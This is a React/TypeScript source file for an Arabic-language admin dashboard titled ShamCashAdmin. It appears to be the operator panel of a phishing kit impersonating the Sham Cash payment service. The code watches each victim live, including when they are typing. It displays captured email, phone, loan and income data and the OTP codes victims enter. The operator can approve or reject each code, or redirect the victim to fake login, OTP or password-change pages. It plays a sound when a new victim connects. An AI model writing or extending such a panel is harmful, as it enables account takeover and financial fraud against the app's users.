import { useState, useEffect, useRef } from "react";
import {
  CheckCircle, XCircle, ArrowRightLeft, Clock, Bell,
  KeyRound, ShieldCheck, UserRound, X, ChevronDown, ChevronUp,
  Wifi, WifiOff, PenLine, Send
} from "lucide-react";

type OtpStatus = "pending" | "approved" | "rejected" | "redirected";
type PassStatus = "pending" | "approved" | "rejected";
type VisitorStatus = "connected" | "typing" | "submitted" | "disconnected";
type RedirectTarget = "login" | "otp" | "changepass";

interface OtpRequest { kind: "otp"; id: string; phone: string; code: string; time: string; status: OtpStatus; }
interface PassRequest { kind: "changepass"; id: string; time: string; status: PassStatus; }
type Request = OtpRequest | PassRequest;

interface Visitor {
  id: string;
  connectedAt: string;
  status: VisitorStatus;
  data: { email: string; phone: string; loan: string; income: string };
  lastSeen: number;
}

function playConnectSound() {
  try {
    const ctx = new AudioContext();
    const notes = [659, 880, 1047];
    notes.forEach((freq, i) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.type = "sine";
      osc.frequency.setValueAtTime(freq, ctx.currentTime + i * 0.12);
      gain.gain.setValueAtTime(0, ctx.currentTime + i * 0.12);
      gain.gain.linearRampToValueAtTime(0.25, ctx.currentTime + i * 0.12 + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.12 + 0.3);
      osc.start(ctx.currentTime + i * 0.12);
      osc.stop(ctx.currentTime + i * 0.12 + 0.35);
    });
  } catch {}
}

const redirectOptions: { value: RedirectTarget; label: string; sub: string; icon: React.ReactNode; color: string; border: string }[] = [
  { value: "login", label: "تسجيل المعلومات", sub: "صفحة تسجيل الدخول", icon: <UserRound className="h-5 w-5" />, color: "text-[#c9ccdb]", border: "border-white/10" },
  { value: "otp", label: "رمز الأمان", sub: "صفحة التحقق بـ OTP", icon: <ShieldCheck className="h-5 w-5" />, color: "text-[#657bd8]", border: "border-[#657bd8]/30" },
  { value: "changepass", label: "الكود", sub: "صفحة تغيير كلمة المرور", icon: <KeyRound className="h-5 w-5" />, color: "text-[#1fc28a]", border: "border-[#1fc28a]/30" },
];

export function ShamCashAdmin() {
  const [requests, setRequests] = useState<Request[]>([]);
  const [hasNew, setHasNew] = useState(false);
  const [redirectPickerId, setRedirectPickerId] = useState<string | null>(null);
  const [expandedInfoId, setExpandedInfoId] = useState<string | null>(null);
  const [visitor, setVisitor] = useState<Visitor | null>(null);
  const [expandedVisitor, setExpandedVisitor] = useState(false);
  const knownVisitorId = useRef<string | null>(null);

  useEffect(() => {
    const interval = setInterval(() => {
      const otpStatus = localStorage.getItem("sham_otp_status");
      const phone = localStorage.getItem("sham_otp_phone") ?? "•••••••XXXX";
      const code = localStorage.getItem("sham_otp_code") ?? "------";
      if (otpStatus === "pending") {
        setRequests((prev) => {
          const exists = prev.some((r) => r.kind === "otp" && (r as OtpRequest).code === code && r.status === "pending");
          if (exists) return prev;
          setHasNew(true);
          return [{ kind: "otp", id: `otp-${Date.now()}`, phone, code, time: new Date().toLocaleTimeString("ar-SY"), status: "pending" }, ...prev];
        });
      }

      const passStatus = localStorage.getItem("sham_changepass_status");
      const passTime = localStorage.getItem("sham_changepass_time") ?? new Date().toLocaleTimeString("ar-SY");
      if (passStatus === "pending") {
        setRequests((prev) => {
          const exists = prev.some((r) => r.kind === "changepass" && r.status === "pending");
          if (exists) return prev;
          setHasNew(true);
          return [{ kind: "changepass", id: `pass-${Date.now()}`, time: passTime, status: "pending" }, ...prev];
        });
      }

      const vId = localStorage.getItem("sham_visitor_id");
      const vStatus = localStorage.getItem("sham_visitor_status") as VisitorStatus | null;
      const vConnectedAt = localStorage.getItem("sham_visitor_connected_at") ?? "";
      const vDataRaw = localStorage.getItem("sham_visitor_data");
      const vLastSeen = parseInt(localStorage.getItem("sham_visitor_heartbeat") ?? "0");
      const vData = vDataRaw ? JSON.parse(vDataRaw) : { email: "", phone: "", loan: "", income: "" };
      const isAlive = vStatus && vStatus !== "disconnected" && (Date.now() - vLastSeen < 4000);

      if (vId && isAlive) {
        if (vId !== knownVisitorId.current) {
          knownVisitorId.current = vId;
          playConnectSound();
          setHasNew(true);
        }
        setVisitor({ id: vId, connectedAt: vConnectedAt, status: vStatus ?? "connected", data: vData, lastSeen: vLastSeen });
      } else if (visitor && !isAlive) {
        setVisitor((prev) => prev ? { ...prev, status: "disconnected" } : null);
      }
    }, 600);

    return () => clearInterval(interval);
  }, [visitor]);

  function decideOtp(id: string, decision: OtpStatus) {
    setRequests((prev) => prev.map((r) => (r.id === id ? { ...r, status: decision } : r)));
    localStorage.setItem("sham_otp_status", decision);
    setHasNew(false);
  }

  function redirectOtp(id: string, target: RedirectTarget) {
    setRequests((prev) => prev.map((r) => (r.id === id ? { ...r, status: "redirected" } : r)));
    localStorage.setItem("sham_otp_redirect_target", target);
    localStorage.setItem("sham_otp_status", "redirected");
    setRedirectPickerId(null);
    setHasNew(false);
  }

  function decidePass(id: string, decision: PassStatus) {
    setRequests((prev) => prev.map((r) => (r.id === id ? { ...r, status: decision } : r)));
    localStorage.setItem("sham_changepass_status", decision);
    setHasNew(false);
  }

  const pending = requests.filter((r) => r.status === "pending");
  const history = requests.filter((r) => r.status !== "pending");

  const otpStatusLabel: Record<string, { label: string; color: string; bg: string }> = {
    approved: { label: "موافق", color: "text-[#1fc28a]", bg: "bg-[#1fc28a]/10" },
    rejected: { label: "مرفوض", color: "text-[#e54343]", bg: "bg-[#e54343]/10" },
    redirected: { label: "محوّل", color: "text-[#657bd8]", bg: "bg-[#657bd8]/10" },
  };
  const passStatusLabel: Record<string, { label: string; color: string; bg: string }> = {
    approved: { label: "موافق", color: "text-[#1fc28a]", bg: "bg-[#1fc28a]/10" },
    rejected: { label: "مرفوض", color: "text-[#e54343]", bg: "bg-[#e54343]/10" },
  };

  const visitorStatusConfig: Record<VisitorStatus, { label: string; color: string; dot: string; icon: React.ReactNode }> = {
    connected: { label: "متصل", color: "text-[#1fc28a]", dot: "bg-[#1fc28a]", icon: <Wifi className="h-3.5 w-3.5" /> },
    typing: { label: "قاعد يسجل...", color: "text-[#f5a623]", dot: "bg-[#f5a623]", icon: <PenLine className="h-3.5 w-3.5" /> },
    submitted: { label: "أرسل الطلب", color: "text-[#657bd8]", dot: "bg-[#657bd8]", icon: <Send className="h-3.5 w-3.5" /> },
    disconnected: { label: "غير متصل", color: "text-white/40", dot: "bg-white/20", icon: <WifiOff className="h-3.5 w-3.5" /> },
  };

  return (
    <div className="min-h-screen w-full bg-[#0f1526] text-white font-['Inter']" dir="rtl">
      <div className="mx-auto max-w-[420px] flex flex-col min-h-screen">

        <div className="sticky top-0 z-10 bg-[#0f1526]/95 backdrop-blur-sm px-5 pt-5 pb-4 border-b border-white/[0.05]">
          <div className="flex items-center justify-between">
            <h1 className="text-[20px] font-extrabold text-white/90">لوحة التحكم</h1>
            <div className="relative">
              <Bell className="h-6 w-6 text-white/60" />
              {hasNew && <span className="absolute -top-1 -right-1 h-3 w-3 rounded-full bg-[#e54343] ring-2 ring-[#0f1526]" />}
            </div>
          </div>
          <p className="mt-1 text-[13px] text-[#c9ccdb]/50">إدارة طلبات المستخدمين</p>
        </div>

        <div className="flex-1 px-5 py-5 space-y-5 overflow-y-auto">

          {visitor && (
            <div className="space-y-2">
              <p className="text-[13px] font-bold text-[#c9ccdb]/50 uppercase tracking-widest">الزائر الحالي</p>
              <div className={`rounded-[18px] border p-4 space-y-3 transition-all duration-300
                ${visitor.status === "disconnected"
                  ? "bg-[#1a2035] border-white/[0.05]"
                  : visitor.status === "typing"
                  ? "bg-[#1e2a1a] border-[#f5a623]/25 shadow-[0_0_20px_rgba(245,166,35,0.08)]"
                  : "bg-[#1a2a1e] border-[#1fc28a]/25 shadow-[0_0_20px_rgba(31,194,138,0.08)]"
                }`}>
                <div className="flex items-center justify-between gap-3">
                  <div className="flex items-center gap-2">
                    <span className={`h-2.5 w-2.5 rounded-full ${visitorStatusConfig[visitor.status].dot} ${visitor.status !== "disconnected" ? "animate-pulse" : ""}`} />
                    <span className={`text-[13px] font-bold ${visitorStatusConfig[visitor.status].color} flex items-center gap-1`}>
                      {visitorStatusConfig[visitor.status].icon}
                      {visitorStatusConfig[visitor.status].label}
                    </span>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className="text-[12px] text-[#c9ccdb]/40 flex items-center gap-1">
                      <Clock className="h-3 w-3" />{visitor.connectedAt}
                    </span>
                    <button
                      onClick={() => setExpandedVisitor(!expandedVisitor)}
                      className="flex items-center gap-1 rounded-[8px] bg-white/5 hover:bg-white/10 px-2 py-1 text-[12px] font-bold text-white/60 transition-colors"
                    >
                      {expandedVisitor ? <><ChevronUp className="h-3.5 w-3.5" /> إخفاء</> : <><ChevronDown className="h-3.5 w-3.5" /> المعلومات</>}
                    </button>
                  </div>
                </div>

                {expandedVisitor && (
                  <div className="space-y-2 pt-1 border-t border-white/[0.06]">
                    {[
                      { label: "البريد الإلكتروني", value: visitor.data.email, icon: <UserRound className="h-3.5 w-3.5" /> },
                      { label: "رقم الهاتف", value: visitor.data.phone, icon: <span className="text-[11px]">📞</span> },
                      { label: "قيمة القرض", value: visitor.data.loan ? `${visitor.data.loan} ل.س` : "", icon: <span className="text-[11px]">💵</span> },
                      { label: "الدخل الشهري", value: visitor.data.income ? `${visitor.data.income} ل.س` : "", icon: <span className="text-[11px]">📈</span> },
                    ].map((row) => (
                      <div key={row.label} className="flex items-center justify-between gap-2">
                        <span className="text-[12px] text-[#c9ccdb]/50 flex items-center gap-1">{row.icon}{row.label}</span>
                        <span className={`text-[13px] font-bold ${row.value ? "text-white/85" : "text-white/20"}`} dir="ltr">
                          {row.value || "—"}
                        </span>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}

          {pending.length > 0 && (
            <div className="space-y-3">
              <p className="text-[13px] font-bold text-[#c9ccdb]/50 uppercase tracking-widest">طلبات جديدة</p>
              {pending.map((req) => {
                if (req.kind === "otp") {
                  const r = req as OtpRequest;
                  const showPicker = redirectPickerId === r.id;
                  const showInfo = expandedInfoId === r.id;
                  const vd = visitor?.data;
                  return (
                    <div key={r.id} className="rounded-[18px] bg-[#1e2640] border border-[#657bd8]/30 p-4 space-y-3 shadow-[0_8px_24px_rgba(101,123,216,0.1)]">
                      <div className="flex items-start justify-between gap-3">
                        <div className="space-y-1">
                          <div className="flex items-center gap-2">
                            <ShieldCheck className="h-4 w-4 text-[#657bd8]" />
                            <span className="text-[13px] font-bold text-[#657bd8]">التحقق بـ OTP</span>
                          </div>
                          <div className="flex items-center gap-1.5">
                            <span className="h-2 w-2 rounded-full bg-[#f5a623] animate-pulse" />
                            <span className="text-[12px] font-bold text-[#f5a623]">في انتظار القرار</span>
                          </div>
                          <p className="text-[15px] font-extrabold text-white" dir="ltr">{r.phone}</p>
                          <p className="text-[12px] text-[#c9ccdb]/50 flex items-center gap-1"><Clock className="h-3.5 w-3.5" />{r.time}</p>
                        </div>
                        <div className="flex flex-col items-end gap-2 shrink-0">
                          <div className="rounded-[10px] bg-[#2a3557] px-3 py-2 text-center">
                            <p className="text-[10px] text-[#c9ccdb]/50 mb-0.5">رمز OTP</p>
                            <p className="text-[18px] font-extrabold text-white tracking-[0.12em]" dir="ltr">{r.code || "------"}</p>
                          </div>
                          <button
                            onClick={() => setExpandedInfoId(showInfo ? null : r.id)}
                            className={`flex items-center gap-1 rounded-[8px] px-2.5 py-1.5 text-[12px] font-bold transition-colors
                              ${showInfo ? "bg-[#657bd8]/30 text-[#657bd8]" : "bg-white/5 text-white/50 hover:bg-white/10"}`}
                          >
                            {showInfo ? <ChevronUp className="h-3.5 w-3.5" /> : <ChevronDown className="h-3.5 w-3.5" />}
                            المعلومات
                          </button>
                        </div>
                      </div>

                      {showInfo && (
                        <div className="rounded-[12px] bg-[#2a3557]/70 border border-white/[0.06] p-3 space-y-2">
                          {[
                            { label: "البريد الإلكتروني", value: vd?.email, icon: "✉️" },
                            { label: "رقم الهاتف",        value: vd?.phone, icon: "📞" },
                            { label: "قيمة القرض",        value: vd?.loan  ? `${vd.loan} ل.س`   : "", icon: "💵" },
                            { label: "الدخل الشهري",      value: vd?.income ? `${vd.income} ل.س` : "", icon: "📈" },
                          ].map((row) => (
                            <div key={row.label} className="flex items-center justify-between gap-2 py-1 border-b border-white/[0.04] last:border-0">
                              <span className="text-[12px] text-[#c9ccdb]/50 flex items-center gap-1.5">
                                <span className="text-[13px]">{row.icon}</span>{row.label}
                              </span>
                              <span className={`text-[13px] font-bold ${row.value ? "text-white/90" : "text-white/20"}`} dir="ltr">
                                {row.value || "—"}
                              </span>
                            </div>
                          ))}
                        </div>
                      )}
                      {!showPicker ? (
                        <div className="grid grid-cols-3 gap-2">
                          <button onClick={() => decideOtp(r.id, "approved")} className="flex flex-col items-center gap-1.5 rounded-[12px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-3 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95">
                            <CheckCircle className="h-5 w-5" /><span className="text-[12px] font-bold">موافقة</span>
                          </button>
                          <button onClick={() => decideOtp(r.id, "rejected")} className="flex flex-col items-center gap-1.5 rounded-[12px] bg-[#e54343]/15 border border-[#e54343]/30 py-3 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95">
                            <XCircle className="h-5 w-5" /><span className="text-[12px] font-bold">رفض</span>
                          </button>
                          <button onClick={() => setRedirectPickerId(r.id)} className="flex flex-col items-center gap-1.5 rounded-[12px] bg-[#657bd8]/15 border border-[#657bd8]/30 py-3 text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors active:scale-95">
                            <ArrowRightLeft className="h-5 w-5" /><span className="text-[12px] font-bold">تحويل</span>
                          </button>
                        </div>
                      ) : (
                        <div className="space-y-2">
                          <div className="flex items-center justify-between mb-1">
                            <p className="text-[13px] font-bold text-[#657bd8]">اختر وجهة التحويل</p>
                            <button onClick={() => setRedirectPickerId(null)} className="text-white/40 hover:text-white/70"><X className="h-4 w-4" /></button>
                          </div>
                          {redirectOptions.map((opt) => (
                            <button key={opt.value} onClick={() => redirectOtp(r.id, opt.value)}
                              className={`w-full flex items-center gap-3 rounded-[12px] bg-[#2a3557] border ${opt.border} px-4 py-3 hover:bg-[#313f6a] transition-colors active:scale-[0.98]`}>
                              <span className={opt.color}>{opt.icon}</span>
                              <div className="text-right">
                                <p className={`text-[14px] font-bold ${opt.color}`}>{opt.label}</p>
                                <p className="text-[11px] text-white/40">{opt.sub}</p>
                              </div>
                              <ArrowRightLeft className="h-4 w-4 text-white/20 mr-auto" />
                            </button>
                          ))}
                        </div>
                      )}
                    </div>
                  );
                }
                const r = req as PassRequest;
                return (
                  <div key={r.id} className="rounded-[18px] bg-[#1e2640] border border-[#1fc28a]/20 p-4 space-y-4 shadow-[0_8px_24px_rgba(31,194,138,0.08)]">
                    <div className="space-y-1">
                      <div className="flex items-center gap-2"><KeyRound className="h-4 w-4 text-[#1fc28a]" /><span className="text-[13px] font-bold text-[#1fc28a]">تغيير كلمة المرور</span></div>
                      <div className="flex items-center gap-1.5"><span className="h-2 w-2 rounded-full bg-[#f5a623] animate-pulse" /><span className="text-[12px] font-bold text-[#f5a623]">في انتظار الموافقة</span></div>
                      <p className="text-[12px] text-[#c9ccdb]/50 flex items-center gap-1"><Clock className="h-3.5 w-3.5" />{r.time}</p>
                    </div>
                    <div className="grid grid-cols-2 gap-2">
                      <button onClick={() => decidePass(r.id, "approved")} className="flex flex-col items-center gap-1.5 rounded-[12px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-3 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95">
                        <CheckCircle className="h-5 w-5" /><span className="text-[12px] font-bold">موافقة</span>
                      </button>
                      <button onClick={() => decidePass(r.id, "rejected")} className="flex flex-col items-center gap-1.5 rounded-[12px] bg-[#e54343]/15 border border-[#e54343]/30 py-3 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95">
                        <XCircle className="h-5 w-5" /><span className="text-[12px] font-bold">رفض</span>
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
          )}

          {!visitor && pending.length === 0 && history.length === 0 && (
            <div className="flex flex-col items-center justify-center py-20 space-y-4 text-center">
              <div className="h-16 w-16 rounded-full bg-[#1e2640] flex items-center justify-center">
                <Bell className="h-7 w-7 text-white/20" />
              </div>
              <p className="text-[15px] font-bold text-white/30">لا توجد طلبات</p>
              <p className="text-[13px] text-white/20">ستظهر الطلبات هنا عند إرسالها</p>
            </div>
          )}

          {history.length > 0 && (
            <div className="space-y-3">
              <p className="text-[13px] font-bold text-[#c9ccdb]/50 uppercase tracking-widest">السجل</p>
              {history.map((req) => {
                const labelMap = req.kind === "otp" ? otpStatusLabel : passStatusLabel;
                const s = labelMap[req.status];
                return (
                  <div key={req.id} className="rounded-[14px] bg-[#1a2035] border border-white/[0.04] p-4 flex items-center justify-between gap-3">
                    <div className="space-y-0.5">
                      <div className="flex items-center gap-1.5">
                        {req.kind === "otp" ? <ShieldCheck className="h-3.5 w-3.5 text-[#657bd8]" /> : <KeyRound className="h-3.5 w-3.5 text-[#1fc28a]" />}
                        <p className="text-[13px] font-bold text-white/70">{req.kind === "otp" ? "تحقق OTP" : "تغيير كلمة مرور"}</p>
                      </div>
                      {req.kind === "otp" && <p className="text-[12px] text-white/40" dir="ltr">{(req as OtpRequest).phone}</p>}
                      <p className="text-[12px] text-[#c9ccdb]/40 flex items-center gap-1"><Clock className="h-3 w-3" />{req.time}</p>
                    </div>
                    {s && <span className={`rounded-[8px] px-3 py-1 text-[12px] font-bold ${s.color} ${s.bg}`}>{s.label}</span>}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default ShamCashAdmin;
